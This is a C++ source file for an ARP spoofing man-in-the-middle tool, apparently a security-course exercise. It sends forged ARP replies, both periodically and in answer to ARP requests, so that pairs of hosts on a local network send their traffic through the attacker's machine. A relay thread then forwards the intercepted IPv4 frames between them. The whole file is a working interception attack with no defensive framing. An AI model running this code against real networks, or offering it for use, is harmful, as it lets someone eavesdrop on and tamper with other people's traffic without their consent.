#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <pcap.h>
#include <ifaddrs.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <thread>
#include <vector>
#include <ctime>
#include <iostream>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct ArpInfectArgs {
    pcap_t* pcap;
    uint8_t attacker_mac[6];
    uint8_t sender_mac[6];
    uint8_t target_mac[6];
};

struct ethernet_header {
    uint8_t dst_mac[6];
    uint8_t src_mac[6];
    uint16_t ether_type;
};

#define ETHER_TYPE_IPV4 0x0800

void usage() {
    printf("syntax: send-arp-smart <interface> <IP1> <IP2> [... pairs]\n");
    printf("sample: send-arp-smart wlan0 192.168.0.2 192.168.0.1\n");
}

void get_network_info(const char* iface, char* my_ip, uint8_t my_mac[6]) {
    struct ifaddrs* ifaddr;
    if(getifaddrs(&ifaddr) < 0) {
        perror("getifaddrs");
        exit(1);
    }
    for(struct ifaddrs* ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
        if(!ifa->ifa_addr || strcmp(ifa->ifa_name, iface) != 0)
            continue;
        if(ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in* sa = (struct sockaddr_in*)ifa->ifa_addr;
            inet_ntop(AF_INET, &sa->sin_addr, my_ip, INET_ADDRSTRLEN);
        }
        if(ifa->ifa_addr->sa_family == AF_PACKET) {
            struct sockaddr_ll* s = (struct sockaddr_ll*)ifa->ifa_addr;
            memcpy(my_mac, s->sll_addr, 6);
        }
    }
    freeifaddrs(ifaddr);
}

void send_arp_packet(pcap_t* pcap,
                     const uint8_t eth_dmac[6], const uint8_t eth_smac[6],
                     uint16_t arp_op,
                     const uint8_t arp_smac[6], const char* arp_sip,
                     const uint8_t arp_tmac[6], const char* arp_tip) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(eth_dmac);
    packet.eth_.smac_ = Mac(eth_smac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(arp_op);

    packet.arp_.smac_ = Mac(arp_smac);
    packet.arp_.sip_ = htonl(Ip(arp_sip));
    packet.arp_.tmac_ = Mac(arp_tmac);
    packet.arp_.tip_ = htonl(Ip(arp_tip));

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(packet));
    if(res != 0) {
        fprintf(stderr, "[Error] pcap_sendpacket error: %s\n", pcap_geterr(pcap));
    }
}

bool resolve_mac(pcap_t* pcap, const char* attacker_ip, const uint8_t attacker_mac[6],
                 const char* target_ip, uint8_t target_mac[6]) {
    uint8_t broadcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    uint8_t zero_mac[6] = {0, 0, 0, 0, 0, 0};

    send_arp_packet(pcap, broadcast, attacker_mac, ArpHdr::Request, attacker_mac, attacker_ip, zero_mac, target_ip);

    time_t start = time(NULL);
    while(time(NULL) - start < 5) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0)
            continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "[Error] pcap_next_ex error: %s\n", pcap_geterr(pcap));
            break;
        }
        const EthArpPacket* arp_packet = reinterpret_cast<const EthArpPacket*>(packet);
        if(ntohs(arp_packet->eth_.type_) != EthHdr::Arp)
            continue;
        if(ntohs(arp_packet->arp_.op_) != ArpHdr::Reply)
            continue;
        char reply_sender_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &arp_packet->arp_.sip_, reply_sender_ip, INET_ADDRSTRLEN);
        if(strcmp(reply_sender_ip, target_ip) == 0) {
            memcpy(target_mac, reinterpret_cast<const uint8_t*>(&arp_packet->arp_.smac_), 6);
            return true;
        }
    }
    return false;
}

bool resolve_mac_main(const char* dev, const char* attacker_ip, const uint8_t attacker_mac[6],
                      const char* target_ip, uint8_t target_mac[6]) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(handle == nullptr) {
        fprintf(stderr, "[Error] Couldn't open device %s: %s\n", dev, errbuf);
        return false;
    }
    bool result = resolve_mac(handle, attacker_ip, attacker_mac, target_ip, target_mac);
    pcap_close(handle);
    return result;
}

void monitor_and_poison(pcap_t* pcap,
                        const uint8_t attacker_mac[6],
                        const char* sender_ip,
                        const char* spoofed_ip,
                        const uint8_t victim_mac[6]) {
    printf("[*] Monitoring ARP requests from %s for %s...\n", sender_ip, spoofed_ip);
    time_t last_spoof = time(NULL);
    const int PERIOD = 5;

    while(true) {
        time_t now = time(NULL);
        if(now - last_spoof >= PERIOD) {
            printf("[*] Periodic spoofing: sending spoofed ARP reply to %s (spoofing %s)\n", sender_ip, spoofed_ip);
            send_arp_packet(pcap, victim_mac, attacker_mac, ArpHdr::Reply, attacker_mac, spoofed_ip, victim_mac, sender_ip);
            last_spoof = now;
        }
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if(res == 0)
            continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "[Error] pcap_next_ex error: %s\n", pcap_geterr(pcap));
            break;
        }
        const EthArpPacket* arp_packet = reinterpret_cast<const EthArpPacket*>(packet);
        if(ntohs(arp_packet->eth_.type_) != EthHdr::Arp)
            continue;
        if(ntohs(arp_packet->arp_.op_) != ArpHdr::Request)
            continue;
        char req_sender_ip[INET_ADDRSTRLEN];
        char req_target_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &arp_packet->arp_.sip_, req_sender_ip, INET_ADDRSTRLEN);
        inet_ntop(AF_INET, &arp_packet->arp_.tip_, req_target_ip, INET_ADDRSTRLEN);
        if(strcmp(req_sender_ip, sender_ip) == 0 && strcmp(req_target_ip, spoofed_ip) == 0) {
            printf("[+] Detected ARP request from %s for %s → sending spoofed reply\n", sender_ip, spoofed_ip);
            send_arp_packet(pcap, victim_mac, attacker_mac, ArpHdr::Reply, attacker_mac, spoofed_ip, victim_mac, sender_ip);
        }
    }
}

void monitor_and_poison_thread(const char* dev, const uint8_t attacker_mac[6],
                               const char* sender_ip, const char* spoofed_ip,
                               const char* attacker_ip) {
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if(pcap == nullptr) {
        fprintf(stderr, "[Error] Couldn't open device %s: %s\n", dev, errbuf);
        return;
    }
    uint8_t victim_mac[6] = {0};
    if(!resolve_mac(pcap, attacker_ip, attacker_mac, sender_ip, victim_mac)) {
        fprintf(stderr, "[Error] Could not resolve MAC address for %s\n", sender_ip);
        pcap_close(pcap);
        return;
    }
    printf("[*] Sending initial spoofed ARP reply to %s (spoofing %s)\n", sender_ip, spoofed_ip);
    send_arp_packet(pcap, victim_mac, attacker_mac, ArpHdr::Reply, attacker_mac, spoofed_ip, victim_mac, sender_ip);
    monitor_and_poison(pcap, attacker_mac, sender_ip, spoofed_ip, victim_mac);
    pcap_close(pcap);
}

void* relay_packets(void* arg) {
    ArpInfectArgs* args = (ArpInfectArgs*)arg;
    printf("[Relay] Starting relay thread with filter 'ip'.\n");
    printf("[Relay] Attacker MAC: ");
    for(int i = 0; i < 6; i++) {
        printf("%02x%s", args->attacker_mac[i], (i==5 ? "\n" : ":"));
    }
    printf("[Relay] Sender MAC: ");
    for(int i = 0; i < 6; i++) {
        printf("%02x%s", args->sender_mac[i], (i==5 ? "\n" : ":"));
    }
    printf("[Relay] Target MAC: ");
    for(int i = 0; i < 6; i++) {
        printf("%02x%s", args->target_mac[i], (i==5 ? "\n" : ":"));
    }

    while(true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(args->pcap, &header, &packet);
        if(res == 0)
            continue;
        if(res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "[Relay Error] pcap_next_ex error: %s\n", pcap_geterr(args->pcap));
            break;
        }
        ethernet_header* eth = (ethernet_header*)packet;
        if(ntohs(eth->ether_type) != ETHER_TYPE_IPV4)
            continue;
        if(memcmp(eth->src_mac, args->attacker_mac, 6) == 0)
            continue;
        if(memcmp(eth->src_mac, args->sender_mac, 6) == 0 &&
            memcmp(eth->dst_mac, args->attacker_mac, 6) == 0) {
            std::cout << "[Relay] Captured packet from Sender. Changing src MAC to Attacker and dst MAC to Target.\n";
            memcpy(eth->src_mac, args->attacker_mac, 6);
            memcpy(eth->dst_mac, args->target_mac, 6);
            pcap_sendpacket(args->pcap, packet, header->caplen);
        }
        else if(memcmp(eth->src_mac, args->target_mac, 6) == 0 &&
                 memcmp(eth->dst_mac, args->attacker_mac, 6) == 0) {
            std::cout << "[Relay] Captured packet from Target. Changing src MAC to Attacker and dst MAC to Sender.\n";
            memcpy(eth->src_mac, args->attacker_mac, 6);
            memcpy(eth->dst_mac, args->sender_mac, 6);
            pcap_sendpacket(args->pcap, packet, header->caplen);
        }
    }
    return nullptr;
}

int main(int argc, char* argv[]) {
    if(argc < 4 || (argc - 2) % 2 != 0) {
        usage();
        return -1;
    }
    char* dev = argv[1];
    uint8_t my_mac[6] = {0};
    char my_ip[INET_ADDRSTRLEN] = {0};
    get_network_info(dev, my_ip, my_mac);

    std::vector<std::thread> spoof_threads;
    std::vector<pthread_t> relay_threads;

    for(int i = 2; i < argc; i += 2) {
        char* ip1 = argv[i];
        char* ip2 = argv[i+1];
        spoof_threads.push_back(std::thread(monitor_and_poison_thread, dev, my_mac, ip1, ip2, my_ip));
        spoof_threads.push_back(std::thread(monitor_and_poison_thread, dev, my_mac, ip2, ip1, my_ip));

        uint8_t mac1[6] = {0}, mac2[6] = {0};
        if(!resolve_mac_main(dev, my_ip, my_mac, ip1, mac1)) {
            fprintf(stderr, "[Error] Failed to resolve MAC for %s\n", ip1);
            continue;
        }
        if(!resolve_mac_main(dev, my_ip, my_mac, ip2, mac2)) {
            fprintf(stderr, "[Error] Failed to resolve MAC for %s\n", ip2);
            continue;
        }
        pcap_t* relay_pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, nullptr);
        if(relay_pcap == nullptr) {
            fprintf(stderr, "[Error] Couldn't open device %s for relay\n", dev);
            continue;
        }
        ArpInfectArgs* relay_args = new ArpInfectArgs;
        relay_args->pcap = relay_pcap;
        memcpy(relay_args->attacker_mac, my_mac, 6);
        memcpy(relay_args->sender_mac, mac1, 6);
        memcpy(relay_args->target_mac, mac2, 6);
        pthread_t tid;
        if(pthread_create(&tid, nullptr, relay_packets, (void*)relay_args) != 0) {
            fprintf(stderr, "[Error] Failed to create relay thread for %s <-> %s\n", ip1, ip2);
            pcap_close(relay_pcap);
            delete relay_args;
            continue;
        }
        relay_threads.push_back(tid);
    }

    for(auto &t : spoof_threads) {
        t.join();
    }

    for(auto &tid : relay_threads) {
        pthread_join(tid, nullptr);
    }

    return 0;
}
